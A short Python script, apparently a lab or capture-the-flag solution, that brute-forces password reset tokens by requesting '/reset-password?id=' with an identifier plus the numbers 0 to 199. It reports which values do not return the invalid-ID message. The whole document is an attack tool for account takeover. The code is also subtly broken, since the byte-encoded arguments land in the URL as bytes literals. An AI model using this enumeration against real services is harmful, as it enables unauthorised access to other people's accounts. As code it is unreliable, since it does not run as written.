import requests
import sys

if (len(sys.argv) != 3):
    raise Exception('Syntax: python3 program.py ip_address identifier')

ip_address = sys.argv[1].encode('utf-8')
identifier = sys.argv[2].encode('utf-8')

for i in range(200):
    r = requests.get(f'{ip_address}/reset-password?id={identifier}{i}')
    if 'Password reset ID is invalid' not in r.text:
        print(i)
